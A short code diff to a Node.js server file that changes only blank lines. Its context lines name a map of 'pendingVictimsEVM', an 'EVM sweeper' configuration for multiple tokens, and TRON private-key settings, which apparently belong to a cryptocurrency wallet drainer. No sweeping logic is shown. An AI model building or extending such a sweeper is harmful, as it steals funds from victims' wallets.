@@ -20,6 +20,7 @@ const pendingVictimsEVM = new Map();
 // 🔒 SWEEP LOCK: Prevents API and Listener from colliding
 const activeSweepsEVM = new Set();
 
+
 // ==========================================
 // 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
 // ==========================================
@@ -413,5 +414,3 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
 app.listen(PORT, () => {
     console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
 });
-
-
